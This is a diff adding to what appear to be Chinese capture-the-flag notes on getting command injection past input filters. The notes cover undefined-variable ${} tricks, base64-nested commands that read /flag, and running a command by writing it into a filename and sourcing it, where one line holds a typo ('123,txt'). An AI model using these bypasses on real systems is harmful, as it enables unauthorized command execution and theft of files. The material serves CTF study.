@@ -29,3 +29,8 @@ ${}未定义变量绕过:${}和${未定义变量}会被当成空字符串,直接
 base64嵌套编码绕过:将目录编码绕过检测,嵌套解码后读取
     cat `(/flag base64编码)|base64 -d`
     cat $((/flag base64编码)|base64 -d)
+文件名设置命令执行:将文件名写入某一文件内,后用source或者.读取文件执行命令
+1.  touch "cat flag.txt"
+    ls "cat flag.txt">123.txt
+    source ./123,txt
+2.(防止对文件名检测,分开写入)
